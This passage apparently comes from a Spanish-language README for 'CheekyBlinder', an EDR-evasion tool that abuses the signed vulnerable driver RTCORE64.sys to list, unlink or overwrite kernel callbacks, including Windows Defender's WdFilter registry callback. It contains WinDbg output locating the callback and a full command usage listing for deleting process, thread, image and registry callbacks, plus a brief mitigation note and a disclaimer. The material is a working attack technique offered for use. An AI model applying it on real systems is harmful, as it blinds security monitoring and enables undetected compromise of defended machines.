lkd> dq fffff800`a4baeabc L1
fffff800`a4baeabc  40244489`48f88b48
</pre>

`nt!CallbackListHead` es una lista enlazada donde cada entrada en el offset 0x28 es la función a la que se llama.

<pre>
lkd> dqs nt!CallbackListHead L2
fffff800`a52f6d90  ffffd182`c338ff70
fffff800`a52f6d98  ffffd182`c7f74850
lkd> dqs ffffd182`c338ff70 L2
ffffd182`c338ff70  ffffd182`c37c2d30
ffffd182`c338ff78  fffff800`a52f6d90 nt!CallbackListHead
</pre>

Sólo contiene una entrada, comprobemos qué hay en el offset 0x28 de esa entrada

<pre>
lkd> dqs nt!CallbackListHead L2
fffff800`a52f6d90  ffffd182`c338ff70
fffff800`a52f6d98  ffffd182`c7f74850
lkd> dqs ffffd182`c338ff70 L2
ffffd182`c338ff70  ffffd182`c37c2d30
ffffd182`c338ff78  fffff800`a52f6d90 nt!CallbackListHead
lkd> dqs ffffd182`c338ff70 L6
ffffd182`c338ff70  ffffd182`c37c2d30
ffffd182`c338ff78  fffff800`a52f6d90 nt!CallbackListHead
ffffd182`c338ff80  00000000`00000000
ffffd182`c338ff88  01db94d7`cec0b740
ffffd182`c338ff90  00000000`00000000
<mark>ffffd182`c338ff98  fffff800`37f98000 WdFilter+0x28000</mark>
</pre>

Tenemos 2 opciones para evitar esto:

1- Eliminar todo el enlace de la lista enlazada => delinking

2- Sobreescribiendo la función en el offset 0x28 con una función compatible con KCFG que simplemente devuelva el enlace inútil.

## Mitigación
Los defensores no deben permitir que se cargue ningún controlador nuevo en un sistema, independientemente de si está firmado o no. Si un usuario necesita un controlador, debe ser revisado y aprobado por TI. Los equipos de seguridad deben configurar sus plataformas EDR o AV para bloquear la carga de cualquier nuevo controlador a menos que se apruebe explícitamente.

## Usage
<pre>
C:\Users\Vixx\Desktop\Tools\PEN-300\EDR Kernel Bypasses\CheekyBlinder-solution\x64\Release>CheekyBlinder.exe
Usage: CheekyBlinder. exe
 /proc - Lista de llamadas de retorno para la creación de procesos
 /delproc <dirección> - Elimina la llamada de retorno para la creación de procesos
 /delprocstealth <dirección> - Sobrescribe la llamada de retorno de la función de creación de procesos
 /thread - Lista de llamadas de retorno para la creación de hilos
 /delthread - Elimina la llamada de retorno para la creación de hilos
 /installDriver - Instala el controlador MSI /uninstallDriver - Instala el controlador MSI. Instala el controlador MSI
 /uninstallDriver - Desinstala el controlador MSI
 /img - Lista las retrollamadas de carga de imágenes
 /delimg <address> - Elimina la retrollamada de carga de imágenes
 /reg - Lista las retrollamadas de modificación del Registro
 /delreg <address> - Elimina la retrollamada del Registro
 /unlinkreg <address> - Elimina la retrollamada de lista enlazada del Registro
 </pre>
Lo que es nuevo del exploit original:

`/unlinkreg` que desvinculará la entrada callback en la lista vinculada.

`/delreg` que sobreescribirá la función callback en la entrada de la lista callback con una función compatible con kcfg que no hace nada.

`/delprocstealth` sobrescribiendo la función Callback de creación de procesos con una función compatible con kcfg que no hace nada.

aunque podemos usar el mismo método stealth para `img` y `thread` también, yo sólo lo hice para el callback de creación de proceso y el callback de registro.

`RTCORE64.sys` necesita estar en la misma carpeta donde está tu exe.

## Reference
https://br-sn.github.io/Removing-Kernel-Callbacks-Using-Signed-Drivers/

### Disclaimer
This project is for **educational purposes only**. Unauthorized use of this tool in production or against systems without explicit permission is strictly prohibited.
